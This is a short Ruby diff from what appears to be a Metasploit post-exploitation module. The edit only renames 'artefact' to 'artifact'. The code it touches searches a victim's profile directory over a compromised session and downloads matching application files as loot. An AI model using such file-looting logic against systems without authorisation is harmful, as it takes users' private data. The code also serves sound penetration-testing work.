-    artefact = opts[:artefact]
+    artifact = opts[:artifact]
     dir = opts[:dir]
     path = opts[:path]
     description = opts[:description]
     file_dir = "#{profile[path]}\\#{dir}"
-    file = session.fs.file.search(file_dir, "#{artefact}", true)
+    file = session.fs.file.search(file_dir, "#{artifact}", true)
     # additional check for file
     return false unless file
 
     file.each do |db|
       # split path for each directory
       guid = db['path'].split('\\')
-      local_loc = "#{guid.last}#{artefact}"
-      saving_path = store_loot("#{app}#{artefact}", "", session, "", local_loc)
+      local_loc = "#{guid.last}#{artifact}"
+      saving_path = store_loot("#{app}#{artifact}", "", session, "", local_loc)
       maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
       print_status("Downloading #{maindb}")
       session.fs.file.download_file(saving_path, maindb)
-      print_status("#{app.capitalize} #{artefact.capitalize} downloaded (#{description})")
+      print_status("#{app.capitalize} #{artifact.capitalize} downloaded (#{description})")
       print_good("File saved to #{saving_path}\n")
       @@success_count += 1
     end
